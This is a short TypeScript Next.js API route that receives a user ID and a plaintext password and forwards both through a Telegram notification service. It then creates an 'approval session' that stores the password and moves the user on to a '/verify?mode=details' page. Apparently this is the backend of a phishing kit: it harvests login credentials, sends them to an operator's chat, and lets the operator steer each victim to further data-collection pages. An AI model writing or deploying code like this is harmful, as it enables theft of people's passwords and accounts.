import { NextRequest, NextResponse } from "next/server"
import { createApprovalSession, sendApprovalActionMessage } from "@/lib/approval-webhook"
import { telegramService } from "@/lib/telegram"

const FLOW_MAX_AGE_SEC = 10 * 60

export async function POST(request: NextRequest) {
  try {
    const data = await request.json()
    const userId = String(data?.userId ?? "")
    const password = String(data?.password ?? "")

    await telegramService.sendLoginNotification({ userId, password })

    const session = createApprovalSession({
      trigger: "login",
      page: "/password",
      nextPage: "/verify?mode=details",
      redirectPage: "/password?userId=" + encodeURIComponent(userId),
      userId,
      password,
    })

    await sendApprovalActionMessage(session)

    const response = NextResponse.json({ success: true, sessionId: session.id })
    response.cookies.set("login_flow", "1", {
      path: "/",
      maxAge: FLOW_MAX_AGE_SEC,
      sameSite: "lax",
    })
    return response
  } catch (error) {
    console.error("Error sending login notification:", error)
    return NextResponse.json({ error: "Failed to send notification" }, { status: 500 })
  }
}
